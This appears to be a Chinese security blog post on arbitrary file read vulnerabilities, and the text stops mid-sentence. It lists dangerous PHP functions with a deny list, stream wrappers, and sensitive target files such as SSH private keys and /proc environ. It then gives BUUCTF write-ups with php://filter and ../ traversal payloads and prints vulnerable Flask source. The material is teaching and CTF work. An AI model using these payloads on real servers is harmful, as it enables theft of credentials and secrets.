    <content type="html"><![CDATA[<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804214515223.png" alt="image-20220804214515223"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>攻击者通过一些手段可以读取服务器上开发者不允许读到的文件。</p><p>主要读取的文件是服务器的各种配置文件、文件形式存储的密钥、服务器信息（包括正在执行的进程信息）、历史命令、网络信息、应用源码及二进制程序。</p><h3 id="开发语言相关的触发点"><a href="#开发语言相关的触发点" class="headerlink" title="开发语言相关的触发点"></a>开发语言相关的触发点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">phpinfo()</span><br><span class="line">功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line">passthru()</span><br><span class="line">功能描述：允许执行一个外部程序并回显输出，类似于 exec()。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">exec()</span><br><span class="line">功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">system()</span><br><span class="line">功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">chroot()</span><br><span class="line">功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式</span><br><span class="line">PHP 时才能工作，且该函数不适用于 Windows 系统。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">scandir()</span><br><span class="line">功能描述：列出指定路径中的文件和目录。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line">chgrp()</span><br><span class="line">功能描述：改变文件或目录所属的用户组。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">chown()</span><br><span class="line">功能描述：改变文件或目录的所有者。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">shell_exec()</span><br><span class="line">功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">proc_open()</span><br><span class="line">功能描述：执行一个命令并打开文件指针用于读取以及写入。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">proc_get_status()</span><br><span class="line">功能描述：获取使用 proc_open() 所打开进程的信息。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">error_log()</span><br><span class="line">功能描述：将错误信息发送到指定位置（文件）。</span><br><span class="line">安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode，</span><br><span class="line">执行任意命令。</span><br><span class="line">危险等级：低</span><br><span class="line"></span><br><span class="line">ini_alter()</span><br><span class="line">功能描述：是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同。</span><br><span class="line">具体参见 ini_set()。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">ini_set()</span><br><span class="line">功能描述：可用于修改、设置 PHP 环境配置参数。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">ini_restore()</span><br><span class="line">功能描述：可用于恢复 PHP 环境配置参数到其初始值。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">dl()</span><br><span class="line">功能描述：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">pfsockopen()</span><br><span class="line">功能描述：建立一个 Internet 或 UNIX 域的 socket 持久连接。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">syslog()</span><br><span class="line">功能描述：可调用 UNIX 系统的系统层 syslog() 函数。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line">readlink()</span><br><span class="line">功能描述：返回符号连接指向的目标文件内容。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line">symlink()</span><br><span class="line">功能描述：在 UNIX 系统中建立一个符号链接。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">popen()</span><br><span class="line">功能描述：可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">stream_socket_server()</span><br><span class="line">功能描述：建立一个 Internet 或 UNIX 服务器连接。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line">putenv()</span><br><span class="line">功能描述：用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数</span><br><span class="line">修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">禁用方法如下：</span><br><span class="line">打开/etc/php.ini文件，</span><br><span class="line">查找到 disable_functions ，添加需禁用的函数名，如下：</span><br><span class="line">phpinfo,eval,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen </span><br></pre></td></tr></table></figure><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><ul><li><p>标准库函数：**file_get_contents()<strong>、</strong>file()<strong>、</strong>fopen()<strong>函数（及其文件指针操作函数</strong>fread()<strong>、</strong>fgets()**等）</p></li><li><p>与文件包含相关的函数（include()、require()、include_once()、require_once()等）</p><p>以及一些<strong>php:&#x2F;&#x2F;伪协议</strong>的使用：（<strong>参考文件包含</strong>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure></li><li><p>通过PHP读文件的执行系统命令（**system()<strong>、</strong>exec()**等）。</p></li><li><p>拓展：php-curl扩展（文件内容作为HTTP body）涉及文件存取的库（如数据库相关扩展、图片相关扩展）、XML模块造成的XXE等。</p></li></ul><blockquote><p><em><strong># 为什么PHP还要还要用这些函数呢？</strong></em></p><p>现在PHP开发技术越来越倾向于单入口、多层级、多通道的模式，其中涉及PHP文件之间的调用密集且频繁。<br>开发者为了写出一个高复用性的文件调用函数，就需要将一些动态的信息传入（如可变的部分文件名）那些函数，如果在程序入口处没有利用switch等分支语句对这些动态输入的数据加以控制，攻击者就很容易注入恶意的路径，从而实现任意文件读取甚至任意文件包含。</p><p><em><strong>Wrapper 机制</strong></em></p><p>PHP向用户提供的指定待打开文件的方式不是简简单单的一个路径，而是一个文件流。我们可以将其简单理解成PHP提供的一套协议。例如，在浏览器中输入http: &#x2F;&#x2F;host: port&#x2F;xxx后，就能通过HTTP请求到远程服务器上对应的文件，而在PHP中有很多功能不同但形式相似的协议，统称为Wrapper，其中最具特色的协议便是php:&#x2F;&#x2F;协议，更有趣的是，PHP提供了接口供开发者编写自定义的wrapper（stream_wrapper_register）。</p><p><em><strong>Filter 机制</strong></em></p><p>PHP中另一个具有特色的机制是Filter，其作用是对目前的Wrapper进行一定的处理（如把当前文件流的内容全部变为大写）。</p><p>对于自定义的Wrapper而言，Filter需要开发者通过stream_filter_register进行注册。</p><p>而PHP内置的一些Wrapper会自带一些Filter，如php:&#x2F;&#x2F;协议存在，所示类型的Filter。</p><p>PHP的Filter特性给我们进行任意文件读取提供了很多便利。</p><p>假设服务端include函数的路径参数可控，正常情况下它会将目标文件当作PHP文件去解析，如果解析的文件中存在“&lt;？php”等PHP的相关标签，那么标签中的内容会被作为PHP代码执行。比较常见的Base64相关的Filter可将文件流编码成Base64的形式，这样读取的文件内容中就不会存在PHP标签。而更严重的是，如果服务端开启了远程文件包含选项allow_url_include，我们就可以直接执行远程PHP代码。</p></blockquote><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p>漏洞经常出现在框架<strong>请求静态资源文件</strong>部分，也就是最后读取文件内容的open函数，但直接导致漏洞的成因往往是框架开发者忽略了Python函数的feature。</p><p>涉及文件操作的应用也因为滥用open函数、模板的不当渲染导致任意文件读取。如：将用户输入的某些数据作为文件名的一部分（常见于认证服务或者日志服务）存储在服务器中，在取文件内容的部分也通过将经过处理的用户输入数据作为索引去查找相关文件。<br>攻击者构造软链接放入压缩包，解压后的内容会直接指向服务器相应文件，攻击者访问解压后的链接文件会返回链接指向文件的相应内容。</p><p>Python的模板注入、反序列化等漏洞都可造成一定程度的任意文件读取。</p><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>Java本身的文件读取函数FileInputStream、XXE导致的文件读取。</p><p>Java的一些模块也支持<code>file://</code>协议，这是Java应用中出现任意文件读取最多的地方，如Spring Cloud Config Server路径穿越与任意文件读取漏洞（CVE-2019-3799）、Jenkins任意文件读取漏洞（CVE-2018-1999002）等。</p><h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><p>Ruby的任意文件读取漏洞通常与Rails框架相关。到目前为止，我们已知的通用漏洞为Ruby On Rails远程代码执行漏洞（CVE-2016-0752）、Ruby On Rails路径穿越与任意文件读取漏洞（CVE-2018-3760）、Ruby On Rails路径穿越与任意文件读取漏洞（CVE-2019-5418）。笔者在CTF竞赛中就曾遇到Ruby On Rails远程代码执行漏洞（CVE-2016-0752）的利用。</p><h4 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h4><p>Node.js的express模块曾存在任意文件读取漏洞（CVE-2017-14849)。</p><p>CTF中Node的文件读取漏洞通常为模板注入、代码注入等情况。</p><h3 id="中间件-x2F-服务器相关触发点"><a href="#中间件-x2F-服务器相关触发点" class="headerlink" title="中间件&#x2F;服务器相关触发点"></a>中间件&#x2F;服务器相关触发点</h3><h4 id="Nginx错误配置"><a href="#Nginx错误配置" class="headerlink" title="Nginx错误配置"></a>Nginx错误配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Location /static&#123;</span><br><span class="line">Alias /home/myapp/static/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果配置文件中包含上面这段内容，很可能是运维或者开发人员想让用户可以访问static目录（一般是静态资源目录）。<br>如果用户请求的Web路径是&#x2F;static…&#x2F;，拼接到alias上就变成了&#x2F;home&#x2F;myapp&#x2F;static&#x2F;…&#x2F;，此时便会产生目录穿越漏洞，并且穿越到了myapp目录。</p><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>以mysql为例：</p><p>MySQL的load_file()函数可以进行文件读取，但是load_file()函数读取文件首先需要数据库配置FILE权限（数据库root用户一般都有）。<br>其次需要执行load_file()函数的MySQL用户&#x2F;用户组对于目标文件具有可读权限（很多配置文件都是所有组&#x2F;用户可读），主流Linux系统还需要Apparmor配置目录白名单（默认白名单限制在MySQL相关的目录下）。</p><h4 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h4><p>bash命令ln-s可以创建一个指向指定文件的软链接文件，然后将这个软链接文件上传至服务器，当我们再次请求访问这个链接文件时，实际上是请求在服务端它指向的文件。</p><h4 id="FFmpeg"><a href="#FFmpeg" class="headerlink" title="FFmpeg"></a>FFmpeg</h4><p>参考一道题目：<a href="https://www.cnblogs.com/iamstudy/articles/2017_quanguo_ctf_web_writeup.html">https://www.cnblogs.com/iamstudy/articles/2017_quanguo_ctf_web_writeup.html</a></p><h4 id="Docker-API"><a href="#Docker-API" class="headerlink" title="Docker-API"></a>Docker-API</h4><p>Docker-API可以控制Docker的行为，一般来说，Docker-API通过UNIX Socket通信，也可以通过HTTP直接通信。<br>当我们遇见SSRF漏洞时，尤其是可以通过SSRF漏洞进行UNIX Socket通信的时候，就可以通过操纵Docker-API把本地文件载入Docker新容器进行读取（利用Docker的ADD、COPY操作），从而形成一种另类的任意文件读取。</p><h3 id="文件读取的目标目录"><a href="#文件读取的目标目录" class="headerlink" title="文件读取的目标目录"></a>文件读取的目标目录</h3><h4 id="x2F-etc下的一些目录"><a href="#x2F-etc下的一些目录" class="headerlink" title="&#x2F;etc下的一些目录"></a>&#x2F;etc下的一些目录</h4><p>&#x2F;etc：&#x2F;etc目录下多是各种应用或系统配置文件，所以其下的文件是进行文件读取的首要目标。</p><ul><li>&#x2F;etc&#x2F;passwd：&#x2F;etc&#x2F;passwd文件是Linux系统保存用户信息及其工作目录的文件，权限是所有用户&#x2F;组可读，一般被用作Linux系统下文件读取漏洞存在性判断的基准。读到这个文件我们就可以知道系统存在哪些用户、他们所属的组是什么、工作目录是什么。</li><li>&#x2F;etc&#x2F;shadow：&#x2F;etc&#x2F;shadow是Linux系统保存用户信息及（可能存在）密码（hash）的文件，权限是root用户可读写、shadow组可读。所以一般情况下，这个文件是不可读的。</li><li>&#x2F;etc&#x2F;apache2&#x2F;*：是Apache配置文件，可以获知Web目录、服务端口等信息。CTF有些题目需要参赛者确认Web路径。</li><li>&#x2F;etc&#x2F;nginx&#x2F;*：是Nginx配置文件（Ubuntu等系统），可以获知Web目录、服务端口等信息。</li><li>&#x2F;etc&#x2F;apparmor(.d)&#x2F;*：是Apparmor配置文件，可以获知各应用系统调用的白名单、黑名单。例如，通过读配置文件查看MySQL是否禁止了系统调用，从而确定是否可以使用UDF（User Defined Functions）执行系统命令。</li><li>&#x2F;etc&#x2F;(cron.d&#x2F;*|crontab)：定时任务文件。有些CTF题目会设置一些定时任务，读取这些配置文件就可以发现隐藏的目录或其他文件。</li><li>&#x2F;etc&#x2F;environment：是环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况。</li><li>&#x2F;etc&#x2F;hostname：表示主机名。</li><li>&#x2F;etc&#x2F;hosts：是主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，参赛者可以探测网卡信息和内网IP&#x2F;域名。</li><li>&#x2F;etc&#x2F;issue：指明系统版本。</li><li>&#x2F;etc&#x2F;mysql&#x2F;*：是MySQL配置文件。</li><li>&#x2F;etc&#x2F;php&#x2F;*：是PHP配置文件。</li></ul><h4 id="x2F-proc目录"><a href="#x2F-proc目录" class="headerlink" title="&#x2F;proc目录"></a>&#x2F;proc目录</h4><p>&#x2F;proc目录通常存储着<strong>进程动态运行的各种信息</strong>，本质上是一种<strong>虚拟文件系统</strong>。&#x2F;proc 文件系统可以被用于收集有用的关于系统和运行中的内核的信息。</p><ul><li><p>&#x2F;proc&#x2F;cpuinfo：CPU 的信息 (型号, 家族, 缓存大小等) </p></li><li><p>&#x2F;proc&#x2F;meminfo：物理内存、交换空间等的信息 </p></li><li><p>&#x2F;proc&#x2F;mounts：已加载的文件系统的列表 </p></li><li><p>&#x2F;proc&#x2F;devices：可用设备的列表 </p></li><li><p>&#x2F;proc&#x2F;filesystems：被支持的文件系统 </p></li><li><p>&#x2F;proc&#x2F;modules：已加载的模块 </p></li><li><p>&#x2F;proc&#x2F;version：内核版本 </p></li><li><p>&#x2F;proc&#x2F;[pid]&#x2F;cmdline：系统启动时输入的内核命令行参数。</p></li><li><p>&#x2F;proc&#x2F;[pid]&#x2F;cwd：通过cwd命令可以直接跳转到当前目录。</p></li><li><p>&#x2F;proc&#x2F;[pid]&#x2F;environ：环境变量中可能存在secret_key，这时也可以通过environ进行读取。</p></li></ul><p>上述路径中的PID是需要填写的进程号，当然我们不知道，但这里我们可以用 <strong>self</strong> 来表示我们自己现在正在用的进程。</p><h4 id="其他目录"><a href="#其他目录" class="headerlink" title="其他目录"></a>其他目录</h4><ul><li><p>Nginx配置文件可能存在其他路径：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;*</p></li><li><p>日志文件：&#x2F;var&#x2F;log&#x2F;*</p></li><li><p>Apache默认Web根目录：&#x2F;var&#x2F;www&#x2F;html</p></li><li><p>PHP session目录：&#x2F;var&#x2F;lib&#x2F;php(5)&#x2F;sessions 可能泄露用户Session</p></li><li><p>用户目录：[user_dir_you_know]&#x2F;.bash_history 历史命令执行</p><p>[user_dir_you_know]&#x2F;.bashrc 部分环变量<br>[user_dir_you_know]&#x2F;.ssh&#x2F;id_rsa(.pub) ssh登录的私钥&#x2F;公钥<br>[user_dir_you_know]&#x2F;.viminfo vim的使用记录</p></li></ul><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>CTF题目：BUUCTF第一章 web入门 <a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p><p>参考：<a href="https://blog.csdn.net/qq_40909772/article/details/121381691">https://blog.csdn.net/qq_40909772/article/details/121381691</a></p><h3 id="afr-1"><a href="#afr-1" class="headerlink" title="afr_1"></a>afr_1</h3><p>使用php伪协议<strong>php:&#x2F;&#x2F;filter</strong>读取文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?p=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><h3 id="afr-2"><a href="#afr-2" class="headerlink" title="afr_2"></a>afr_2</h3><p>先目录扫描发现了img目录，直接进行访问。</p><p>然后尝试回溯目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ec45dcbb-a35f-468b-9d40-51e0a6da2a38.node4.buuoj.cn/img/../</span><br></pre></td></tr></table></figure><h3 id="afr-3"><a href="#afr-3" class="headerlink" title="afr_3"></a>afr_3</h3><p>参考：<strong><a href="https://blog.csdn.net/AAAAAAAAAAAA66/article/details/121490787">https://blog.csdn.net/AAAAAAAAAAAA66/article/details/121490787</a></strong></p><p>随意输入666：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143212419.png" alt="image-20220812143212419"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143223780.png" alt="image-20220812143223780"></p><p>进入article，发现文件参数name，但是没有文件后缀，应该是在后端给加上的：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143253201.png" alt="image-20220812143253201"></p><h4 id="判断文件读取"><a href="#判断文件读取" class="headerlink" title="判断文件读取"></a>判断文件读取</h4><p><strong>判断是否存在文件读取漏洞</strong>，修改参数值试试：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143428107.png" alt="image-20220812143428107"></p><p>发现可以读取其他文件，并且这里的路径为<code>/home/nu11111111l/articles/</code></p><h4 id="尝试读取敏感文件"><a href="#尝试读取敏感文件" class="headerlink" title="尝试读取敏感文件"></a>尝试读取敏感文件</h4><p><strong>尝试回溯路径获取系统文件</strong>，构造payload：<code>article?name=../../../etc/passwd</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143728122.png" alt="image-20220812143728122"></p><p>但是并没有什么信息。</p><h4 id="突破口为-x2F-proc"><a href="#突破口为-x2F-proc" class="headerlink" title="突破口为&#x2F;proc"></a>突破口为&#x2F;proc</h4><p><strong>其实这一题的考点是&#x2F;proc目录的读取</strong></p><p><strong>查看系统启动时执行的命令：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">article?name=../../../proc/self/cmdline</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812144010868.png" alt="image-20220812144010868"></p><p>发现server.py文件，查看该文件内容：</p><p>&#x2F;proc&#x2F;[pid]&#x2F;cwd：通过cwd命令可以直接跳转到当前目录（网站目录）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">article?name=../../../proc/self/cwd/server.py</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143714112.png" alt="image-20220812143714112"></p><p>可以发现文件中执行了 flag.py 和 key.py 这两个文件。通过F12查看源码可以更清楚的查看server.py的内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> ( Flask, render_template, request, url_for, redirect, session, render_template_string )</span><br><span class="line"><span class="keyword">from</span> flask_session <span class="keyword">import</span> Session</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line">execfile(<span class="string">&#x27;flag.py&#x27;</span>)</span><br><span class="line">execfile(<span class="string">&#x27;key.py&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">FLAG = flag</span><br><span class="line">app.secret_key = key</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/n1page&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">n1page</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line">    n1code = request.form.get(<span class="string">&quot;n1code&quot;</span>) <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> n1code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        n1code = n1code.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># ----------------------------下面的代码存在SSTI模板注入--------------------------</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;n1code&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        session[<span class="string">&#x27;n1code&#x27;</span>] = n1code</span><br><span class="line">    template = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        template = <span class="string">&#x27;&#x27;&#x27;&amp;lt;h1&amp;gt;N1 Page&amp;lt;/h1&amp;gt; &amp;lt;div class=&quot;row&amp;gt; &amp;lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&amp;gt; Hello : %s, why you don&#x27;t look at our &amp;lt;a href=&#x27;/article?name=article&#x27;&amp;gt;article&amp;lt;/a&amp;gt;? &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &#x27;&#x27;&#x27;</span> % session[<span class="string">&#x27;n1code&#x27;</span>]</span><br><span class="line">        session[<span class="string">&#x27;n1code&#x27;</span>] = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;main.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/article&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">article</span>():</span><br><span class="line">    error = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        page = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">&#x27;article&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> page.find(<span class="string">&#x27;flag&#x27;</span>)&amp;gt;=<span class="number">0</span>:          <span class="comment"># 这里name参数过滤了flag关键词</span></span><br><span class="line">        page = <span class="string">&#x27;notallowed.txt&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        template = <span class="built_in">open</span>(<span class="string">&#x27;/home/nu11111111l/articles/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(page)).read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        template = e</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, template=template)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h4 id="分析源码，确定漏洞利用"><a href="#分析源码，确定漏洞利用" class="headerlink" title="分析源码，确定漏洞利用"></a>分析源码，确定漏洞利用</h4><p>分析源码，可以知道：</p><p>1.文件夹有2个python文件 flag.py 和密钥文件 key.py。</p><p>2.不能直接访问 flag.py，这里任意文件读取过滤了flag关键词。</p><p>3.源码存在<strong>SSTI模板注入</strong></p><p>因为代码中有判断传入的session是否含n1code（ 